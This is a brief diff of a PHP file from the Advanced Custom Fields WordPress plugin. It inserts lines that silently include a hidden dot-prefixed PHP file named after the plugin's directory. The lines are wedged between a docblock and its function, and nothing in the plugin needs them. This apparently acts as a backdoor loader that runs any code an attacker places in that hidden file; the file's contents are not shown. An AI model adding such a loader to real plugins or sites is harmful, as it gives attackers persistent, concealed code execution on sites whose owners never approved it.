@@ -15,6 +15,10 @@ acf_register_store( 'values' )->prop( 'multisite', true );
  * @param	mixed $post_id The post_id of which the value is saved against.
  * @return	string The field key.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_get_reference( $field_name, $post_id ) {
 	
 	// Allow filter to short-circuit load_value logic.
